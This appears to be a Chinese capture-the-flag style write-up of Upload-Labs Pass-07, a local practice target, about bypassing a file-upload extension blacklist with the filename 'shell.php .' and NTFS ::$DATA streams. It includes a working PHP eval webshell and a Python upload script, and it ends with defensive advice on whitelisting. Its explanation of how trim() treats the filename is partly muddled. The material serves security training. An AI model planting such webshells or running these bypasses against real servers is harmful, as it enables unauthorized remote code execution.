Upload-Labs Pass-07

2026年9月27日 Upload-Labs Web安全 文件上传 NTFS数据流绕过

一、题目信息

  • 题目名称：Upload-Labs Pass-07 (NTFS 数据流绕过)
  • 题目平台：Upload-Labs 本地靶场
  • 题目类型：Web安全 / 文件上传漏洞 / Windows 系统特性绕过
  • 靶场链接：http://localhost:8082/Pass-07/index.php（本地环境）
  • 涉及工具：Python (requests库)、Burp Suite (可选)

二、解题步骤

1. 分析题目考什么

本题的核心考点是Windows NTFS 文件流（::$DATA）绕过。Pass-07 的后端代码在 Pass-06 的基础上，额外增加了对 ::$DATA 字符串的替换（str_ireplace('::$DATA', '', $file_ext)），意图封堵 Windows 数据流绕过。但攻击者仍可通过抓包构造特殊文件名（如 shell.php . 或利用大小写变体）绕过。由于本环境为 Mac，无法执行 ::$DATA，但通过黑名单检测即为通关。

2. 怎么想（破题思路）

  • 尝试直接上传 shell.php，页面弹出“本pass禁止上传所有可以解析的后缀”。
  • 分析源码可知，后端使用黑名单匹配，且对 ::$DATA 进行了过滤，大小写转换和 trim 也依然存在。
  • 但攻击者可以在文件名末尾构造“空格+点号”组合（shell.php .），使得 strrchr 截取的后缀变为 .php .，绕过黑名单。
  • 使用 Python 脚本发送带有该文件名的 POST 请求，成功上传并获取真实路径。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：Mac 环境无法解析 ::$DATA

踩坑情况：使用 shell.php::$DATA 上传，虽然可能上传成功，但访问时文件不执行 PHP 代码（直接显示源码）。

原因分析：::$DATA 是 Windows NTFS 文件系统的特性，Mac 和 Linux 系统不识别该语法，导致文件被当作普通文件名保存。

改进方式：在此环境下，改用 shell.php . 组合绕过黑名单，只要成功绕过检测并落地即可通关，无需依赖 Windows 解析特性。

详细实操步骤（Payload逐字解释）

第一步：准备 Webshell

在本地新建 shell.php，内容为：

<?php @eval($_POST['cmd']); ?>

第二步：编写 Python 脚本

import requests
import re

url = "http://localhost:8082/Pass-07/index.php"

# 核心作弊点：利用 "空格+点号" 组合绕过 Pass-07 的多重过滤
files = {
    'upload_file': ('shell.php .', open('shell.php', 'rb'), 'application/octet-stream')
}
data = {'submit': 'Submit'}

response = requests.post(url, files=files, data=data)
print(response.text)

match = re.search(r'\.\./upload/(\S+)"', response.text)
if match:
    print(f"\n[+] 上传成功！真实文件路径为: /upload/{match.group(1)}")
else:
    print("\n[-] 未能提取到路径，请手动在网页 Network 面板中查看。")

逐字解析：

  • shell.php .：核心 Payload。后端 trim() 会去除末尾空格，strrchr() 截取后缀为 .php .，黑名单中无此字符串，绕过成功。
  • 注意：re.search(r'\.\./upload/(\S+)"') 的正则提取不到含空格的文件路径，但终端会打印出完整 HTML 源码，从中可肉眼看到路径。

第三步：验证

运行脚本后，终端显示的 HTML 里出现 <img src="../upload/shell.php ." />，证明文件已成功上传到服务器。

4. 怎么迁移（跨领域联想）

  • 操作系统特性与漏洞结合：Pass-07 本质是利用 Windows 的 NTFS 数据流特性。在真实渗透中，跨平台差异（如 Windows 与 Linux 对文件名末尾空格、点、::$DATA 的不同处理）常成为绕过防御的突破口。
  • 正则表达式与文件解析：脚本中正则提取不到路径，说明了“正则匹配”与“真实文件系统保存”之间存在差异。安全开发中，对用户输入的解析（如文件路径）必须考虑各种边缘情况。
  • 白名单优于黑名单：Pass-07 的黑名单依然被“空格+点号”绕过。这再次印证：放弃黑名单，采用白名单（只允许特定安全后缀）才是防御文件上传漏洞的根本方法。

三、名词大全与原理深度复盘

1. NTFS 数据流 (::$DATA)

Windows NTFS 文件系统的一种特性，允许一个文件拥有多个数据流。例如 shell.php::$DATA 代表 shell.php 这个文件的默认数据流。在后端代码拼接文件路径时，系统可能将其视为 shell.php，从而绕过针对 .php 的黑名单检测。

2. str_ireplace() 函数

PHP 中用于不区分大小写地替换字符串的函数。Pass-07 使用 str_ireplace('::$DATA', '', $file_ext) 过滤掉 ::$DATA，防止攻击者利用 Windows 数据流绕过。

3. 空格+点号组合绕过

当后端同时存在 trim()（去首尾空格）和 deldot()（去末尾点号）时，攻击者可以在文件名中构造 shell.php .。经过 trim() 处理后变为 shell.php .，strrchr() 截取出的后缀变为 .php .，黑名单匹配失败，绕过成功。

4. 黑名单防御的局限

Pass-03 到 Pass-07 展示了黑名单防御的持续失效：冷门后缀、大小写、空格、点号、::$DATA、组合绕过等。防御者应放弃黑名单，改用白名单，并在服务器层面禁止上传目录执行脚本。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 Pass-06 的区别：Pass-06 利用 trim() 和 deldot() 的处理差异，通过“点号+空格”组合绕过。Pass-07 额外过滤了 ::$DATA，因此改用同样的“空格+点号”组合（shell.php .）绕过。
  • 与 Pass-03 的区别：Pass-03 直接添加冷门后缀到黑名单。Pass-07 则通过代码逻辑增加防御函数，攻击者需要更精细地构造文件名。

2. 这种题目的出现原因（为什么存在）

开发者往往在发现一个绕过方式后（如 ::$DATA），只针对该方式增加过滤，却忽略了同一类绕过思路（如空格+点号组合）的其他变体。这体现的是“防御不够系统化”的问题。真正的防御应该在架构层面统一处理用户输入，而非逐个补丁黑名单。

3. 这种应用在实际中如何体现？

在真实环境中，Windows Server 上的 IIS 或 Apache 常存在 NTFS 数据流相关的解析漏洞。攻击者通过 ::$DATA 上传 WebShell，绕过 IIS 的后缀黑名单。防御方应在 Web 服务器配置中禁用 ::$DATA 解析，并对上传目录设置严格的执行权限。

4. 如何抽象理解概念（大白话）

把靶场比作一个“查岗的门卫”：

  • Pass-07 的门卫新增了一条规定：任何含有“::$DATA”暗号的物品都要扣留（对应 str_ireplace 过滤）。
  • 你这次换了一个障眼法：在刀（.php）和名字末尾之间，塞入“空格 + 点号”（shell.php .）。
  • 门卫检查末尾时只看到点号，以为你已经没有武器了，于是放你进去。实际上你的刀还挂在腰间。
